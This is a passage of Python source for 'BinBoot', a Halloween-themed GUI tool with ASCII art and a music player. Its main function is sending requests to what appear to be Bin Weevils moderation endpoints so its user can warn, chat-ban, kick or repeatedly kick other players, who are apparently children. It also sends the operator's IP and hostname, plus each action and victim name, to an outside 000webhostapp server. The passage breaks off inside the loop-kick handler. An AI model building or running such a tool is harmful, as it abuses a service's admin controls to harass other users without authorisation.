import urllib, urllib.error, urllib.request
from urllib import parse
from multiprocessing import Process, Queue
import psutil
q = Queue()
d = Queue()
import requests
import os
import signal
import keyboard
pid = os.getpid()
import re
import time
import random
import hashlib
import socket
import http
import platform
import vlc
import sys
import tkinter
from tkinter import *
if not os.geteuid() == 0:
	print("This script needs to be run as root.")
	exit()

def exitNice(signum, frame):
	global running 
	running = False
def keyEvent(e):
	global running
	if e.name == "q":
		exitNice("", "")
		print("Quitting")
running = True
arr = []
path = os.getcwd() + "/binbootMusic"
fileg = path + "/m.txt"
filef = path + "/p.txt"
open(fileg,"w")
with open(filef, "w") as kfile:
	kfile.write("0")
	kfile.close()
import glob
songcounter = 0
os.chdir(path)
def musicPlayer(q, d):
	for file in glob.glob("*.mp3"):
		arr.append(file)
		global songcounter
		songcounter += 1
	with open(fileg,"r") as lister1:
		contentcheck = lister1.read()
		if len(contentcheck) < 1:
			lister1.close()
			pass
		else:
			contentarr = contentcheck.split("\n")
			endi = len(contentarr)-1
			contentarr.pop(endi)
			if len(contentarr) == songcounter:
			    print("Playlist end reached. Playing last song...")
			for o in range(0,len(contentarr)):
				songremove = contentarr[o]
				for z in range(0,len(arr)-1):
					if songremove == arr[z]:
						arr.pop(z)
					else:
						continue
	for i in range(0,len(arr)):
		song = arr[i]
		q.put(song)
		instance = vlc.Instance()
		instance.log_unset()
		player = instance.media_player_new()
		media = instance.media_new(song)
		player.set_media(media)
		player.play()
		time.sleep(1.5)
		duration = player.get_length() / 1000
		d.put(duration)
		time.sleep(duration)
		player.stop()
		instance = None
		player = None
		media = None
		song = None
		continue
def playerWindow(q, d):
	global musicWindow
	musicWindow = Tk()
	musicWindow.title("BinBoot 2.1.1 Music Player")
	musicWindow.geometry("600x600")
	musicWindow.configure(bg="black")
	musicTitle1 = Label(musicWindow, text="Now playing: \n", justify=LEFT, fg="#ffffff", bg="black")
	if not q.empty():
		songname = q.get()
		with open("skipFile.txt","w") as skipper:
			skipper.write(songname)
			skipper.close()
		songduration = d.get()
		songduration = int(songduration) * 1000
	else:
		songname = "Not playing"
		with open("skipFile.txt","w") as skipper:
			skipper.write(songname)
			skipper.close()
		songduration = 1
	global musicTitle2
	with open("skipFile.txt","r") as skipper1:
		songname = skipper1.read()
		skipper1.close()
	musicTitle2 = Label(musicWindow, text=songname, justify=LEFT, fg="#ba1c2c", bg="black")
	musicTitle1.place(x=150,y=0)
	musicTitle2.place(x=150,y=40)
	def updateWindow():
		if not q.empty():
			songname = q.get()
			with open("skipFile.txt","w") as skipper:
				skipper.write(songname)
				skipper.close()
			songduration = d.get()
			songduration = int(songduration) * 1000
		else:
			songname = "Not playing"
			with open("skipFile.txt","w") as skipper:
				skipper.write(songname)
				skipper.close()
			songduration = 1
		global musicTitle2
		musicTitle2.destroy()
		musicTitle2 = Label(musicWindow, text=songname, justify=LEFT, fg="#ba1c2c", bg="black")
		musicTitle2.place(x=185,y=40)
		musicWindow.after(songduration, updateWindow)
	def skipsong():
		with open("skipFile.txt","r") as skipper:
			songname = skipper.read()
			skipper.close()
		print("Skipping...",songname)
		with open(fileg,"a+") as lister:
			songname = songname + "\n"
			lister.write(songname)
		global p1
		p1.terminate()
		p1 = Process(target=musicPlayer, args=(q, d, ))
		p1.start()
		time.sleep(1)
		updateWindow()
	def pausesong():
		with open(filef, "r") as actionfile:
			actionlight = actionfile.read()
			global actionP
			actionP = psutil.Process(p1.pid)
			if actionlight == "0":
				actionP.suspend()
				print("Paused")
				actionfile.close()
				with open(filef,"w") as lfile:
					lfile.write("1")
					lfile.close()
			elif actionlight == "1":
				actionP.resume()
				print("Resumed")
				actionfile.close()
				with open(filef,"w") as lfile:
					lfile.write("0")
					lfile.close()
	def exitplayer():
		musicWindow.destroy()
		p1.terminate()
	pauseButton = Button(text="Play/Pause",width=5,height=1,bg="orange",fg="white",command=pausesong)
	skipButton = Button(text="Skip",width=5,height=1,bg="orange",fg="white",command=skipsong)
	quitButton = Button(text="Exit",fg="white",bg="orange",command=exitplayer)
	quitButton.place(x=190,y=100)
	skipButton.place(x=130, y=100)
	pauseButton.place(x=60,y=100)
	musicWindow.after(songduration, updateWindow)
	musicWindow.mainloop()
def bootMain():
	try:
		def mainGUI():
		    halloweenTitle = r"""
		    .-. .-')                .-') _ .-. .-')                             .-') _    
\  ( OO )              ( OO ) )\  ( OO )                           (  OO) )   
 ;-----.\   ,-.-') ,--./ ,--,'  ;-----.\  .-'),-----.  .-'),-----. /     '._  
 | .-.  |   |  |OO)|   \ |  |\  | .-.  | ( OO'  .-.  '( OO'  .-.  '|'--...__) 
 | '-' /_)  |  |  \|    \|  | ) | '-' /_)/   |  | |  |/   |  | |  |'--.  .--' 
 | .-. `.   |  |(_/|  .     |/  | .-. `. \_) |  |\|  |\_) |  |\|  |   |  |    
 | |  \  | ,|  |_.'|  |\    |   | |  \  |  \ |  | |  |  \ |  | |  |   |  |    
 | '--'  /(_|  |   |  | \   |   | '--'  /   `'  '-'  '   `'  '-'  '   |  |    
 `------'   `--'   `--'  `--'   `------'      `-----'      `-----'    `--'    
            """
		    text1 = r"""
          ___
       ___)__|_
  .-*'          '*-,
 /      /|   |\     \
;      /_|   |_\     ;
;   |\           /|  ;
;   | ''--...--'' |  ;
 \  ''---.....--''  /
  ''*-.,_______,.-*' 
		    """
		    text2 = r"""
		     ,'"".
		     )  ,|
		    /  /,'-.
		   /  //  /.`.
		 ,'  //  /  `.`.
		(    )--.`.   //|
		|`--'|   `.`.// |
		 `--'      `./  /
		   |         | /
		   |_________|/  
		        
		    """
		    text3 = r"""
		           \:.             .:/
		            \``._________.''/ 
		             \             / 
		     .--.--, / .':.   .':. \
		    /__:  /  | '::' . '::' |
		       / /   |`.   ._.   .'|
		      / /    |.'         '.|
		     /___-_-,|.\  \   /  /.|
		          // |''\.;   ;,/ '|
		          `==|:=         =:|
		             `.          .'
		    l42        :-._____.-:
		              `''       `''
		    """
		    text4 = r"""
		    __________________|      |____________________________________________
		         ,--.    ,--.          ,--.   ,--.
		        |oo  | _  \  `.       | oo | |  oo|
		    o  o|~~  |(_) /   ;       | ~~ | |  ~~|o  o  o  o  o  o  o  o  o  o  o
		        |/\/\|   '._,'        |/\/\| |/\/\|
		    __________________        ____________________________________________
		                      |      |dwb
		    """
		    text5 = r"""
		    .
		|^  .
		\O___.____ /
		  \   .  /
		    \ ,/
		     []
		     []
		     []
		  --------
	  Chuckles"""
		    text6 = r"""
		  _
		 {_}
		 |(|
		 |=|
		/   \
		|.--|
		||  |
		||  |    .    ' .
		|'--|  '     \~~~/
		'-=-' \~~~/   \_/
		       \_/     Y
		        Y     _|_
		jgs    _|_
		    """
		    text7 = r"""
		      ,--./,-.
		     / #      \
		    |          |
		     \        /    hjw
		      `._,._,'
		    """
		    text8 = r"""
	   T
	 .-"-.
	|  ___|
	| (.\/.)
	|  ,,,' 
	| '###
	 '----'
		    """
		    text9 = r"""
		   ,-.
		 / \  `.  __..-,O
		:   \ --''_..-'.'
		|    . .-' `. '.
		:     .     .`.'
		 \     `.  /  ..
		  \      `.   ' .
		   `,       `.   \
		  ,|,`.        `-.\
		 '.||  ``-...__..-`
		  |  |
		  |__|
		  /||\
		 //||\\
		// || \\
	 __//__||__\\__
	'--------------' SSt
		    """
		    text10 = r"""
		     .--
		 .--'  '.   
		=`..-.'_ `---,  
		      ` ` .\'    
		           `'BP
		    """
		    text11 = r"""
		         ,
		        /|      __
		       / |   ,-~ /
		      Y :|  //  /
		      | jj /( .^
		      >-"~"-v"
		     /       Y
		    jo  o    |
		   ( ~T~     j
		    >._-' _./
		   /   "~"  |
		  Y     _,  |
		 /| ;-"~ _  l
		/ l/ ,-"~    \
		\//\/      .- \
		 Y        /    Y    -Row
		 l       I     !
		 ]\      _\    /"\
		(" ~----( ~   Y.  )
		    """
		    text12 = r"""
		                __            ================================
		     ALCATRAZ  /__\            ||     ||<(.)>||<(.)>||     || 
		   ____________|  |            ||    _||     ||     ||_    || 
		   |_|_|_|_|_|_|  |            ||   (__D     ||     C__)   || 
		   |_|_|_|_|_|_|__|            ||   (__D     ||     C__)   ||
		  A@\|_|_|_|_|_|/@@Aa          ||   (__D     ||     C__)   ||
	   aaA@@@@@@@@@@@@@@@@@@@aaaA      ||   (__D     ||     C__)   ||
	  A@@@@@@@@@@@DWB@@@@@@@@@@@@A     ||     ||     ||     ||  dwb||
	^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ================================
	681
		    """
		    text13 = r"""
	============;===========;()
			# # # #::::::
			# # # #::::::
			# # # #::::::
			# # # #::::::
			# # # # # # #
			# # # # # # #
			# # # # # # #
			# # # # # # #
			# # # # # # #
			# # # # # # #
		    """
		    text14 = r"""
		                                            \  /
		                                            (())
		                                            ,~L_
		                                           2~~ <\
		                                           )>-\y(((GSSSSSSssssss>=  _/
		         ___________________________________)v_\__________________________________
		        (_// / / / (///////\3__________((_/      _((__________E/\\\\\\\) \ \ \ \\_)
		          (_/ / / / (////////////////////(c  (c /|\\\\\\\\\\\\\\\\\\\\) \ \ \ \_)
		            "(_/ / / /(/(/(/(/(/(/(/(/(/(/\_    /\)\)\)\)\)\)\)\)\)\)\ \ \ \_)"
		               "(_/ / / / / / / / / / / / /|___/\ \ \ \ \ \ \ \ \ \ \ \ \_)"
		         jjs      "(_(_(_(_(_(_(_(_(_(_(_(_[_]_|_)_)_)_)_)_)_)_)_)_)_)_)"
		                                           |    \
		                                          /      |
		                                         / /    /___
		                                        /           "~~~~~__
		                                        \_\_______________\_"_?
		                             Spirit of Heaven, Goddess of Fire and Life
		        
		                                     Every Man's Dream
		    """
		    text15 = r"""
	   __ 
	  /\ \   Mobius Strip
	 / /\ \
	/ /__\ \
	\/____\/    mn
		    """
		    text16 = r"""
				  'x|`
				'|xx| `          '|x|
			`   '    |xx|    `   '    |x|`
				 |xx|             |x|
			============|===============|===--
			ejm ~~~~~|xx|~~~~~~~~~~~~~|x|~~~ ~~  ~   ~
		    """
		    text17 = r"""
	__          __
	\\\        ///
	 \\\  __  ///
	  \\\/__\///
	   \\\__///
	   |\\\///|
	   |_XXXX_|
	   \///\\\/
	   ///__\\\
	  ///1878\\\
	 ///______\\\
	///________\\\
	~|__________|~
	 ||_||  ||_||
	 |___|  |___|  
		    """
		    text18 = r"""
		           *      ((((
*            *        *  (((
       *                (((      *
  *   / \        *     *(((    
   __/___\__  *          (((
     (O)  |         *     ((((
*  '<   ? |__ ... .. .             *
     \@      \    *    ... . . . *
     //__     \
    // ||\__   \    |~~~~~~ . . .   *
====M===M===| |=====|~~~~~~   . . .. .. .
         *  \ \ \   |~~~~~~    *
  *         <__|_|   ~~~~~~ .   .     ... .
		    """
		    text19 = r"""
		      /}
      _,---~-LJ,-~-._
   ,-^  '   '   '    ^:,
  :   .    '      '     :
 :     /| .   /\   '     :
:   . //|    // \   '     :
:     `~` /| `^~`    '     ;
:  '     //|         '    :
:   \-_  `~`    ,    '    :
;  . \.\_,--,_;^/   ,    :
 :    ^-_!^!__/^   ,    :
  :,  ,  .        ,    :   -ZEUS-
    ^--_____     .   ;`
            `^''----`

		    """
		    text20 = r"""
		                                                  ,           ^'^  _
                                              )               (_) ^'^
         _/\_                    .---------. ((        ^'^
         (('>                    )`'`'`'`'`( ||                 ^'^
    _    /^|                    /`'`'`'`'`'`\||           ^'^
    =>--/__|m---               /`'`'`'`'`'`'`\|
         ^^           ,,,,,,, /`'`'`'`'`'`'`'`\      ,
                     .-------.`|`````````````|`  .   )
                    / .^. .^. \|  ,^^, ,^^,  |  / \ ((
                   /  |_| |_|  \  |__| |__|  | /,-,\||
        _         /_____________\ |")| |  |  |/ |_| \|
       (")         |  __   __  |  '==' '=='  /_______\     _
      (' ')        | /  \ /  \ |   _______   |,^, ,^,|    (")
       \  \        | |--| |--| |  ((--.--))  ||_| |_||   (' ')
     _  ^^^ _      | |__| |("| |  ||  |  ||  |,-, ,-,|   /  /
   ,' ',  ,' ',    |           |  ||  |  ||  ||_| |_||   ^^^
.,,|RIP|,.|RIP|,.,,'==========='==''=='==''=='=======',,....,,,,.,ldb
		    """
		    text21 = r"""
		                                           _
                       /\              )\
         _           __)_)__        .'`--`'.
         )\_      .-'._'-'_.'-.    /  ^  ^  \
      .'`---`'. .'.' /o\'/o\ '.'.  \ \/\/\/ /
     /  <> <>  \ : ._:  0  :_. : \  '------'       _J_
     |    A    |:   \\/\_/\//   : |     _/)_    .'`---`'.
     \  <\_/>  / :  :\/\_/\/:  : /   .'`----`'./.'0\ 0\  \
    _?_._`"`_.'`'-:__:__:__:__:-'   /.'<\   /> \:   o    |
 .'`---`'.``  _/(              /\   |:,___A___,|' V===V  /
/.'a . a  \.'`---`'.        __(_(__ \' \_____/ /'._____.'
|:  ___   /.'/\ /\  \    .-'._'-'_.'-:.______.' _?_
\'  \_/   |:   ^    |  .'.' (o\'/o) '.'.     .'`'''`'.
 '._____.'\' 'vvv'  / / :_/_:  A  :_\_: \   /   ^.^   \
           '.__.__.' | :   \'=...='/   : |  \  `===`  /
        jgs           \ :  :'.___.':  : /    `-------`
                       '-:__:__:__:__:-'
		    """
		    text22 = r"""
		                                .-----.
                          .'       `.
                         :      ^v^  :
                         :           :
                         '           '
          |~        www   `.       .'
         /.\       /#^^\_   `-/\--'
        /#  \     /#%    \   /# \
       /#%   \   /#%______\ /#%__\
      /#%     \   |= I I ||  |- |
      ~~|~~~|~~   |_=_-__|'  |[]|
        |[] |_______\__|/_ _ |= |`.
 ^V^    |-  /= __   __    /-\|= | :;
        |= /- /\/  /\/   /=- \.-' :;
        | /_.=========._/_.-._\  .:'
        |= |-.'.- .'.- |  /|\ |.:'
        \  |=|:|= |:| =| |~|~||'|
         |~|-|:| -|:|  |-|~|~||=|      ^V^
         |=|=|:|- |:|- | |~|~|| |
         | |-_~__=_~__=|_^^^^^|/___
         |-(=-=-=-=-=-(|=====/=_-=/\
         | |=_-= _=- _=| -_=/=_-_/__\
         | |- _ =_-  _-|=_- |]#| I II
         |=|_/ \_-_= - |- = |]#| I II
         | /  _/ \. -_=| =__|]!!!I_II!!
        _|/-'/  ` \_/ \|/' _ ^^^^`.==_^.
      _/  _/`-./`-; `-.\_ / \_'\`. `. ===`.
     / .-'  __/_   `.   _/.' .-' `-. ; ====;\
    /. jgs./    \ `. \ / -  /  .-'.' ====='  >
   /  \  /  .-' `--.  / .' /  `-.' ======.' /
HAPPY ALL HALLOW'S EVE AND ALL SOULS DAY!  -jgs
		    """
		    text23 = r"""
		    Art by Joan G. Stark
  '.  `~~`~`~~^`~~`~^~^`~~`~~`~^~`.   .`     /
    `> ' . ' ". _ '-"`  .  ` ' .   | .    ' /
   .' ,'~^~^~^`^~~^`^~`~~~^~~~^;       ' ' |
   .-'                          \ ` : ` . "|_
                                | | ,  | : | \
                                | "   `    |  \
                                | , :   |  |  /~--,__
                                |     `  , |  \__,--~'
                        ("-,_   |" `  | `, |   /
                         "-,_"-,|, _    ,  |__/
                             "-,|   \\______/ \
                                |,  | / _\___/ \
                               /| "  \ \/\  ||   \
                              / |     \   \,||    \
                        __.--~\ |`  `  \__/ ||     ),_
                       `~--.__/ | , |    :/  \   /-,_"-,_    __
                             \  |   `,   /=,'/ ('    `-,_"-,/_ /~=,_
                              \_| |   __/=/ |   \        "-/-,//~=,_~=,_
                              / |`   (__ / ('    \         \_//_~=,_~=,
                             / \\______//   \     )         '=,_~=,_~=
                            /   ___/_ \ | .| `\__(              ~=,_~
                           /    |   /\/ /" |
                        _.(     | ./   /   |
              __    _.-"_.-\   /|_ \__/ ' '|
         _.=~\ _\.-"_.-'    `) \  \:   | . |
     _.=~_.=~\\.-\-"        /   `.=\  .'   |
      .=~_.=~_\\_/         /    | \=\__  | |
       =~_.=~_.=`         (     `) \ __)  '|
        ~_.=~              )__/'| '   "   '|
                                | . " | ' .|
 '-"_'"-'_"'-_'"-_''_"-"-_"-\ \/'   '   . '`\/"/- '"-_-"'_ _-"'__-"'_
-_ --"-"_jgs_""-_'"--"'_-"-'\\/.\\' / /".\,//\//'-"-_'"-"'_'"-"''"-"'_
   -"-'_-"_-"-_"-"'_'-"-"_``"-`"_`'""-`''""'-_'"-"-_"'"-   '"- _'"- _
		    """
		    text24 = r"""
.___,_______,_____Happy_Halloween____.
| ./(       )\.        |             |
| )  \/\_/\/  (        |             |
| `)  (^Y^)  (`      \(|)/           |
|  `),-(~)-,(`      --(")--          |
|      '"'      \\    /`\            |
|          .-'```^```'-.    ,     ,  |
|         /   (\ __ /)  \   )\___/(  |
|         |    ` \/ `   |  {(@)v(@)} |
|         \    \____/   /   {|~~~|}  |
|          `'-.......-'`    {/^^^\}  |
.___ldb______________________`m-m`___.
			"""
		    global window1
		    window1 = Tk()
		    window1.title("BinBoot v2.1.1")
		    window1.geometry('1000x800')
		    window1.configure(bg='black')
		    artTest = Label(window1, justify=LEFT, text=text1, fg="orange", bg="black", font="TkFixedFont")
		    artTest.place(x=0, y=15)
		    lbl301 = Label(window1, justify=LEFT, text="Changelog:\n\n2.1.1: HALLOWEEN UPDATE!\n\n-New Art\n-New color/theme\n-Bigger window\n-Russian Roulette\n-Trick or Treat\n-Music Player\n-More!", fg="#ba1c2c", bg="black")
		    lbl301.place(x=460,y=80)
		    lbl4 = Label(window1, text="Welcome to BinBoot v2.1.1!\nUse your own VPN!", fg="white", bg="black")
		    lbl4.place(x=240, y=10)
		    lbl5 = Label(window1, text="Menu:", fg="#b409ed", bg="black")
		    menu1 = Label(window1, text="[0] Warn Player", fg="orange", bg="black")
		    menu2 = Label(window1, text="[1] Chat Ban Player", fg="#ffffff", bg="black")
		    menu3 = Label(window1, text="[2] Kick Player", fg="#5e26a3", bg="black")
		    menu4 = Label(window1, text="[3] Loopkick", fg="orange", bg="black")
		    menu5 = Label(window1, text="[4] Listkick", fg="#ffffff", bg="black")
		    menu6 = Label(window1, text="[5] Listed Loopkick", fg="#5e26a3", bg="black")
		    menu7 = Label(window1, text="[6] Russian Roulette", fg="orange", bg="black")
		    menu8 = Label(window1, text="[7] Trick or Treat", fg="#ffffff", bg="black")
		    menu9 = Label(window1, text="[8] Exit", fg="#5e26a3", bg="black")
		    loggedInAs = Label(window1, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		    halloweenTitle1 = Label(window1, text=halloweenTitle, fg="white", bg="black", font="TkFixedFont")
		    halloweenTitle1.place(x=10,y=530)
		    loggedInAs.place(x=5,y=470)
		    lbl5.place(x=300,y=70)
		    menu1.place(x=260,y=100)
		    menu2.place(x=260,y=130)
		    menu3.place(x=260,y=160)
		    menu4.place(x=260,y=190)
		    menu5.place(x=260,y=220)
		    menu6.place(x=260, y=250)
		    menu7.place(x=260, y=280)
		    menu8.place(x=260, y=310)
		    menu9.place(x=260, y=340)
		    try:
		        url = 'https://enigmapr0ject.000webhostapp.com/blacklistCheck.php'
		        data = {'user': loginUsername,'IP': ipaddr,'hostname': host_name}
		        x = requests.post(url, data=data)
		    except http.client.BadStatusLine:
		        pass
		    optionHandler = Entry(window1)
		    optionHandler.place(x=260,y=380)
		    def getOption():
		        optionActual = optionHandler.get()
		        if optionActual == "0":
		            window1.destroy()
		            global window2
		            window2 = Tk()
		            window2.title("BinBoot v2.1.1")
		            window2.geometry('1000x800')
		            window2.configure(bg='black')
		            loggedInAs = Label(window2, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		            loggedInAs.place(x=5,y=470)
		            artTest2 = Label(window2, justify=LEFT, text=text2, fg="#fc1c03", bg="black", font="TkFixedFont")
		            artTest2.place(x=0, y=15)
		            artTest3 = Label(window2, justify=LEFT, text=text3, fg="orange", bg="black", font="TkFixedFont")
		            artTest3.place(x=400, y=100)
		            witchArt = Label(window2, justify=LEFT, text=text18, fg="#ffffff", bg="black", font="TkFixedFont")
		            witchArt.place(x=400,y=400)
		            lbl100 = Label(window2, text="Please enter the weevil you want to warn:", bg="black", fg="white")
		            lbl101 = Entry(window2)
		            lbl102 = Label(window2, text="Please enter the warning message:", bg="black", fg="red")
		            lbl103 = Entry(window2)
		            def submit():
		                warnName = lbl101.get()
		                warnMessage = lbl103.get()
		                if len(warnName) > 0 and len(warnMessage) > 0:
		                    warnName = parse.quote(warnName)
		                    warnMessage = parse.quote(warnMessage)
		                    requestURL = "http://sfs2.binweevils.com/Crisp/REST/warn/" + warnName + "/" + warnMessage + "/0"
		                    requestURL3 = requestURL.replace(' ','%20')
		                    try:
		                        urllib.request.urlopen(requestURL3, timeout=1)
		                        url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
		                        data = {'Username': loginUsername,'Action': "Warn",'Victim': warnName, 'Extra': warnMessage}
		                        x = requests.post(url, data=data)
		                    except http.client.BadStatusLine:
		                        pass
		                    window2.destroy()
		                    global window3
		                    window3 = Tk()
		                    window3.title("BinBoot v2.1.1")
		                    window3.geometry("1000x800")
		                    window3.configure(bg='black')
		                    artTest9 = Label(window3, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
		                    artTest9.place(x=450, y=0)
		                    artTest11 = Label(window3, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
		                    artTest11.place(x=0, y=150)
		                    artTest10 = Label(window3, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
		                    artTest10.place(x=0, y=50)
		                    lbl201 = Label(window3, text="Warning sent!", bg="black", fg="#03fc2c")
		                    lbl201.place(x=310,y=100)
		                    button4 = Button(
		                    text="Continue",
		                    width=5,
		                    height=1,
		                    bg="green",
		                    fg="white",
		                    command=window3.destroy
		                    )
		                    button4.place(x=310,y=200)
		                    window3.mainloop()
		                else:
		                    print("You cannot leave the fields empty!")
		            button3 = Button(
		            text="Submit",
		            width=5,
		            height=1,
		            bg="red",
		            fg="white",
		            command=submit
		            )
		            lbl100.place(x=260,y=10)
		            lbl101.place(x=260,y=40)
		            lbl102.place(x=260,y=70)
		            lbl103.place(x=260,y=100)
		            button3.place(x=260,y=340)
		        elif optionActual == "1":
		            window1.destroy()
		            global window9
		            window9 = Tk()
		            window9.title("BinBoot v2.1.1")
		            window9.geometry('1000x800')
		            window9.configure(bg='black')
		            loggedInAs = Label(window9, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		            loggedInAs.place(x=5,y=470)
		            artTest4 = Label(window9, justify=LEFT, text=text4, fg="#03fc14", bg="black", font="TkFixedFont")
		            artTest4.place(x=20, y=250)
		            artTest5 = Label(window9, justify=LEFT, text=text5, fg="orange", bg="black", font="TkFixedFont")
		            artTest5.place(x=10, y=50)
		            pumpkin1 = Label(window9, justify=LEFT, text=text19, fg="#f7ad52", bg="black", font="TkFixedFont")
		            pumpkin1.place(x=400,y=400)
		            lblg = Label(window9, text="Please enter the weevil you want to chat ban:", bg="black", fg="white")
		            lblgh = Entry(window9)
		            lblghi = Label(window9, text="Please enter the ban message:", bg="black", fg="white")
		            lblghij = Entry(window9)
		            lblghijk = Label(window9, text="Please enter the number of minutes you would\n like to ban the weevil for:", bg="black", fg="red")
		            lblghijkl = Entry(window9)
		            def submit():
		                banName = lblgh.get()
		                banMessage = lblghij.get()
		                banMinutes = lblghijkl.get()
		                if len(banName) > 0 and len(banMessage) > 0 and len(banMinutes):
		                    banName = parse.quote(banName)
		                    banMessage = parse.quote(banMessage)
		                    requestURL = "http://sfs2.binweevils.com/Crisp/REST/2/" + banName + "/" + banMessage + "/" + str(banMinutes) + "/"
		                    requestURL3 = requestURL.replace(' ','%20')
		                    try:
		                        urllib.request.urlopen(requestURL3, timeout=1)
		                        url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
		                        extrainfo = banMessage + " BANNED FOR: " + banMinutes
		                        data = {'Username': loginUsername,'Action': "Ban",'Victim': banName, 'Extra': extrainfo}
		                        x = requests.post(url, data=data)
		                    except http.client.BadStatusLine:
		                        pass
		                    window9.destroy()
		                    global window8
		                    window8 = Tk()
		                    window8.title("BinBoot v2.1.1")
		                    window8.geometry("1000x800")
		                    window8.configure(bg='black')
		                    loggedInAs = Label(window8, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		                    loggedInAs.place(x=5,y=470)
		                    artTest9 = Label(window8, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
		                    artTest9.place(x=450, y=0)
		                    artTest11 = Label(window8, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
		                    artTest11.place(x=0, y=150)
		                    artTest10 = Label(window8, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
		                    artTest10.place(x=0, y=50)
		                    lbl201 = Label(window8, text="Chat ban sent!", bg="black", fg="#03fc2c")
		                    lbl201.place(x=310,y=100)
		                    button4 = Button(
		                    text="Continue",
		                    width=5,
		                    height=1,
		                    bg="green",
		                    fg="white",
		                    command=window8.destroy
		                    )
		                    button4.place(x=310,y=200)
		                    window8.mainloop()
		                else:
		                    print("You cannot leave the fields empty!")
		            button5 = Button(
		            text="Submit",
		            width=5,
		            height=1,
		            bg="red",
		            fg="white",
		            command=submit
		            )
		            lblg.place(x=260,y=10)
		            lblgh.place(x=260,y=40)
		            lblghi.place(x=260,y=70)
		            lblghij.place(x=260,y=100)
		            lblghijk.place(x=260,y=130)
		            lblghijkl.place(x=260,y=170)
		            button5.place(x=260,y=200)
		        elif optionActual == "2":
		            window1.destroy()
		            global window10
		            window10 = Tk()
		            window10.title("BinBoot v2.1.1")
		            window10.geometry('1000x800')
		            window10.configure(bg='black')
		            loggedInAs = Label(window10, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		            loggedInAs.place(x=5,y=470)
		            artTest6 = Label(window10, justify=LEFT, text=text6, fg="#c603fc", bg="black", font="TkFixedFont")
		            artTest6.place(x=0, y=15)
		            artTest7 = Label(window10, justify=LEFT, text=text7, fg="red", bg="black", font="TkFixedFont")
		            artTest7.place(x=400, y=200)
		            artTest8 = Label(window10, justify=LEFT, text=text8, fg="#0ced3d", bg="black", font="TkFixedFont")
		            artTest8.place(x=300, y=200)
		            mansion1 = Label(window10, justify=LEFT, text=text20, fg="#f087fa", bg="black", font="TkFixedFont")
		            mansion1.place(x=350,y=380)
		            lbl44 = Label(window10, text="Please enter the weevil you want to kick:", bg="black", fg="white")
		            lbl45 = Entry(window10)
		            def submit():
		                kickName = lbl45.get()
		                if len(kickName) > 0:
		                    kickName = parse.quote(kickName)
		                    requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
		                    requestURL3 = requestURL.replace(' ','%20')
		                    try:
		                        urllib.request.urlopen(requestURL3, timeout=1)
		                        url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
		                        data = {'Username': loginUsername,'Action': "Kick",'Victim': kickName, 'Extra': "Null"}
		                        x = requests.post(url, data=data)
		                    except http.client.BadStatusLine:
		                        pass
		                    window10.destroy()
		                    global window89
		                    window89 = Tk()
		                    window89.title("BinBoot v2.1.1")
		                    window89.geometry("1000x800")
		                    window89.configure(bg='black')
		                    loggedInAs = Label(window89, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		                    loggedInAs.place(x=5,y=470)
		                    artTest9 = Label(window89, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
		                    artTest9.place(x=450, y=0)
		                    artTest11 = Label(window89, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
		                    artTest11.place(x=0, y=150)
		                    artTest10 = Label(window89, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
		                    artTest10.place(x=0, y=50)
		                    lbl201 = Label(window89, text="Kick sent!", bg="black", fg="#03fc2c")
		                    lbl201.place(x=310,y=100)
		                    button4 = Button(
		                    text="Continue",
		                    width=5,
		                    height=1,
		                    bg="green",
		                    fg="white",
		                    command=window89.destroy
		                    )
		                    button4.place(x=310,y=200)
		                    window89.mainloop()
		                else:
		                    print("You cannot leave the field empty!")
		            button55 = Button(
		            text="Submit",
		            width=5,
		            height=1,
		            bg="red",
		            fg="white",
		            command=submit
		            )
		            lbl44.place(x=260,y=10)
		            lbl45.place(x=260,y=40)
		            button55.place(x=260,y=70)
		        elif optionActual == "3":
		            window1.destroy()
		            global window55
		            window55 = Tk()
		            window55.title("BinBoot v2.1.1")
		            window55.geometry('1000x800')
		            window55.configure(bg='black')
		            loggedInAs = Label(window55, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		            loggedInAs.place(x=5,y=470)
		            lbl445 = Label(window55, text="Please enter the weevil you want to loopkick:", bg="black", fg="white")
		            lbl455 = Entry(window55)
		            lbl466 = Label(window55, text="Please enter the number of times you want to kick them:", bg="black", fg="#fcb147")
		            kicktimes = Entry(window55)
		            artTest12 = Label(window55, justify=LEFT, text=text12, fg="#ffffff", bg="black", font="TkFixedFont")
		            artTest12.place(x=340, y=300)
		            artTest13 = Label(window55, justify=LEFT, text=text13, fg="orange", bg="black", font="TkFixedFont")
		            artTest13.place(x=0, y=180)
		            def submit():
		                timer = kicktimes.get()
		                timer = int(timer)
		                kickName = lbl455.get()
		                if len(kickName) > 0 and timer > 0:
		                    window55.destroy()
		                    global window56
		                    window56 = Tk()
		                    window56.title("BinBoot v2.1.1")
		                    window56.geometry("1000x800")
		                    window56.configure(bg='black')
		                    loggedInAs = Label(window56, text="Logged in as: " + loginUsername, fg="#ba1c2c", bg="black")
		                    loggedInAs.place(x=5,y=470)
		                    artTest9 = Label(window56, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
		                    artTest9.place(x=450, y=0)
		                    artTest11 = Label(window56, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
		                    artTest11.place(x=0, y=150)
		                    artTest10 = Label(window56, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
